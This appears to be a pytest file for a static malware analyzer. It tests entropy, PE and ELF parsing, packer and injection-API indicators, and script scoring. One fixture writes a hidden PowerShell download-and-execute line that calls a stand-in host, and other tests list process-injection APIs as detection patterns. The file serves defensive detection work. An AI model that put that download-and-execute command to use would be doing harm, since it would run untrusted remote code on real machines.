from __future__ import annotations

import math
import os
from pathlib import Path

import pytest

from centralium.agent.interfaces import StaticAnalyzer
from centralium.agent.malware_analysis import StaticFileAnalyzer, shannon_entropy
from tests.unit.static_builders import build_elf, build_pe, random_bytes

A = StaticFileAnalyzer()


def test_entropy_bounds() -> None:
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"A" * 1000) == 0.0
    assert shannon_entropy(bytes(range(256)) * 4) == pytest.approx(8.0)
    assert shannon_entropy(b"AB" * 100) == pytest.approx(1.0)
    assert shannon_entropy(random_bytes(1 << 16)) > 7.9
    assert math.isclose(shannon_entropy(memoryview(b"ab")), 1.0)


def test_protocol() -> None:
    assert isinstance(A, StaticAnalyzer)


def test_benign_pe(tmp_path: Path) -> None:
    p = tmp_path / "ok.exe"
    p.write_bytes(
        build_pe(
            [(".text", b"\x90" * 0x400, 0x60000020), (".data", b"\x01" * 0x200, 0xC0000040)],
            imports={
                "kernel32.dll": [f"Fn{i}" for i in range(12)] + ["ExitProcess"],
                "user32.dll": ["MessageBoxA"],
            },
            signed=True,
        )
    )
    r = A.analyze(p)
    assert r.file_type == "pe" and r.score < 10
    assert r.details["signer_present"] is True and r.details["signer_verified"] is False
    assert [s["name"] for s in r.details["sections"]] == [".text", ".data", ".idata"]
    assert r.details["imports"]["kernel32.dll"][0] == "Fn0"


def test_suspicious_packed_pe(tmp_path: Path) -> None:
    p = tmp_path / "bad.exe"
    p.write_bytes(
        build_pe(
            [("UPX0", b"", 0xE0000080), ("UPX1", random_bytes(0x4000), 0xE0000040)],
            imports={"kernel32.dll": ["LoadLibraryA", "GetProcAddress"]},
            entry_section=1,
        )
    )
    r = A.analyze(p)
    assert r.score >= 60
    for want in (
        "packer_section:UPX0",
        "likely_packed",
        "few_imports",
        "rwx_section:UPX1",
        "high_entropy_section:UPX1",
    ):
        assert want in r.indicators, r.indicators
    assert r.details["packed"] is True


def test_pe_injection_api_set(tmp_path: Path) -> None:
    p = tmp_path / "inj.exe"
    imps = {
        "kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "OpenProcess"]
        + [f"F{i}" for i in range(10)]
    }
    p.write_bytes(build_pe(imports=imps))
    r = A.analyze(p)
    assert "api_set:process_injection" in r.indicators
    assert set(r.details["suspicious_apis"]["process_injection"]) == {
        "virtualallocex",
        "writeprocessmemory",
        "createremotethread",
    }
    assert (
        r.score
        > A.analyze(
            _write(tmp_path, "n.exe", build_pe(imports={"kernel32.dll": [f"F{i}" for i in range(12)]}))
        ).score
    )


def _write(d: Path, name: str, data: bytes) -> Path:
    p = d / name
    p.write_bytes(data)
    return p


def test_malformed_pe(tmp_path: Path) -> None:
    good = build_pe()
    for i, data in enumerate((b"MZ" + b"\xff" * 100, good[:150], good[:0x90] + b"\x00" * 20, b"MZ")):
        r = A.analyze(_write(tmp_path, f"m{i}.exe", data))
        assert r.file_type == "pe" and "malformed_pe" in r.indicators and 0 <= r.score <= 100


def test_benign_system_elf() -> None:
    ls = Path("/usr/bin/ls")
    if not ls.exists():
        pytest.skip("no /usr/bin/ls")
    r = A.analyze(ls)
    assert r.file_type == "elf" and r.score < 30, (r.score, r.indicators)
    assert "likely_packed" not in r.indicators and r.details["packed"] is False
    assert r.details["dynamic_imports"] and 0 < r.entropy < 8


def test_suspicious_synthetic_elf(tmp_path: Path) -> None:
    p = _write(
        tmp_path,
        "s.elf",
        build_elf(
            undefined_symbols=("ptrace", "memfd_create", "execve", "process_vm_writev"), rwx_segment=True
        ),
    )
    r = A.analyze(p)
    assert r.file_type == "elf" and r.score >= 40
    for want in ("api:ptrace", "api:memfd_create", "api:process_vm_writev", "rwx_segment"):
        assert want in r.indicators
    clean = A.analyze(_write(tmp_path, "c.elf", build_elf(undefined_symbols=("puts", "exit"))))
    assert clean.score == 0 and clean.details["dynamic_imports"] == ["exit", "puts"]


def test_packed_stripped_elf(tmp_path: Path) -> None:
    data = build_elf(
        with_sections=False, rwx_segment=True, text=random_bytes(8192), extra_head=b"UPX!\x00" * 4
    )
    r = A.analyze(_write(tmp_path, "u.elf", data))
    assert {"no_section_headers", "upx_packed", "likely_packed", "rwx_segment"} <= set(r.indicators)
    assert r.score >= 50


def test_malformed_elf(tmp_path: Path) -> None:
    good = build_elf(undefined_symbols=("ptrace",))
    for i, data in enumerate((good[:70], b"\x7fELF" + b"\xff" * 200, good[:200], b"\x7fELF")):
        r = A.analyze(_write(tmp_path, f"x{i}.elf", data))
        assert r.file_type == "elf" and 0 <= r.score <= 100 and r.entropy <= 8


def test_script_and_other(tmp_path: Path) -> None:
    ps = _write(
        tmp_path,
        "a.ps1",
        b"powershell -w hidden -enc "
        + b"QQ" * 30
        + b"\nIEX (New-Object Net.WebClient).DownloadString('http://x.test')",
    )
    r = A.analyze(ps)
    assert r.file_type == "script" and r.score >= 40 and "script:download_exec" in r.indicators
    assert A.analyze(_write(tmp_path, "n.sh", b"#!/bin/sh\necho hello\n")).score == 0
    other = A.analyze(_write(tmp_path, "blob.bin", random_bytes(10000)))
    assert other.file_type == "other" and other.score <= 5 and other.entropy > 7.5


def test_unreadable_and_missing(tmp_path: Path) -> None:
    r = A.analyze(tmp_path / "nope")
    assert r.score == 0 and r.file_type == "unknown" and r.indicators[0].startswith("cannot_open")
    assert A.analyze(tmp_path).indicators == ["not_a_regular_file"]
    if hasattr(os, "mkfifo"):
        os.mkfifo(tmp_path / "ff")
        assert A.analyze(tmp_path / "ff").indicators == ["not_a_regular_file"]
